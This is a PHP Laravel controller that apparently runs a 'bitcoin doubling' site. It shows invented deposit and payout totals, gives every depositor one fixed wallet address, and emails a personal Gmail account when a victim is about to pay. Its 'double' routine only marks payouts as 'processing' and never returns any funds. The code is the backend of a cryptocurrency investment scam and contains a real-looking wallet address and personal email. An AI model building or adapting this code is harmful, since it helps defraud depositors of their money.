<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use App\Deposits;
use App\Payouts;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$totalDeposit = "12449.1245786542";
        $totalPayout = "104641.54678413";
        $totalPayoutTransactions = "2045137";
        $totalDepositAccounts = "226312";
    	$latestDeposits = $this->helpers->getDeposits();
        $latestPayouts = $this->helpers->getPayouts();
        
    	return view('index', compact(['latestDeposits', 'latestPayouts','totalDepositAccounts', 'totalPayoutTransactions', 'totalDeposit', 'totalPayout']));
    }
    
    
    public function postSignup(Request $request)
	{
           $req = $request->all();
          # dd($req);
          $ret = "";
          $wallet = "1NnqMhCiss4AChv7WJ9qR4dfJrPY6tUcRE";              	
               
                $validator = Validator::make($req, [
                             'email' => 'required|email',
                             'amount' => 'required|numeric',
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       //return redirect()->back()->withInput()->with('errors',$messages);
                       //dd($messages);
             
                       $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                 }
                
                 else
                 { 
                 	$email = $req['email'];
                     $deposit =Deposits::where([ ['email',$email], 
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "pending"]
                                                                     ])->first();
                    
                    $payout =Payouts::where([ ['email',$req['email'] ],                                                                      
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "processing"], 
                                                                     ])->first();                                 
                      
                     if($deposit != null){
                     	$arr2 = ['mode' => "done-before", 'email' => $deposit->email, 'amount' => $deposit->amount, 'wallet' => $wallet];
                         $ret = json_encode($arr2);
                     } 
                     
                     else{
                      if($payout != null){
                         	$arr2 = ['mode' => "processing"];
                             $ret = json_encode($arr2);                                                  
                         } 
                         
                 	else if($req['amount'] > 0.9999 || $req['amount'] < 0.0001)
                      {
                         if($req['amount'] > 0.9999) $ret = "too-high";
                         else if($req['amount'] < 0.0001) $ret = "too-low";
                      }
                      
                      else
                      {                            	
                          $statusNumber = $this->helpers->getStatusNumber();
                          $arr = ['email' => $req['email'], 'amount' => $req['amount'], 'wallet' => "", 'status_number' => $statusNumber];                          
                          $this->helpers->addDeposit($arr);
                          $this->helpers->sendEmail("kudayisitobi@gmail.com" ,"Client Is About To Deposit Bitcoin",['arr' => $arr],'emails.deposit_alert','view');                     	
                          $arr2 = ['mode' => "first-time", 'amount' => $req['amount'], 'wallet' => $wallet];
                          $ret = json_encode($arr2);
                      }  
                   }                                                                          
                 }
                         
                 return $ret;              
	}
	
	
	public function postDouble(Request $request)
	{
           $req = $request->all();
          # dd($req);
          $ret = "";
          $wallet = "1NnqMhCiss4AChv7WJ9qR4dfJrPY6tUcRE";              	
               
                $validator = Validator::make($req, [
                             'amount' => 'required|numeric',
                             'email' => 'required|email', 
                             'profit_wallet' => 'required', 
                             'status_number' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       //return redirect()->back()->withInput()->with('errors',$messages);
                       //dd($messages);
             
                       $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                 }
                
                 else
                 {                      
                     $deposit =Deposits::where([ ['email',$req['email'] ],                                                                       
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "pending"], 
                                                                        ['status_number', $req['status_number'] ]
                                                                     ])->first();                                                                
                                                                     
                      
                    $payout =Payouts::where([ ['email',$req['email'] ],                                                                       
                                                                        ['amount',$req['amount'] ], 
                                                                        ['status', "processing"], 
                                                                        ['wallet', $req['profit_wallet'] ]
                                                                     ])->first();                                            
                      
                     if($deposit != null){
                     	$arr2 = ['mode' => "just-paid", 'email' => $deposit->email, 'amount' => $deposit->amount, 'wallet' => $req['profit_wallet'] ];
                         $this->helpers->addPayout($arr2);
                         $deposit->delete();
                                              	
                         $ret = json_encode($arr2);                                                                     
                     } 
                     
                     else{                     	
                         if($payout != null){
                         	$arr2 = ['mode' => $payout->status];
                             $ret = json_encode($arr2);                                                  
                         } 
                         
                         else{
                         	 $arr2 = ['mode' => "invalid"];
                             $ret = json_encode($arr2); 
                         } 
                        
                     }                                                              
                 }
                  
                 return $ret;          
	}
	
	
	public function getSeed()
    {
        Deposits::where('status', " active")->update(['status' =>"active"]);
    	return redirect()->intended('/');                           
    }

}
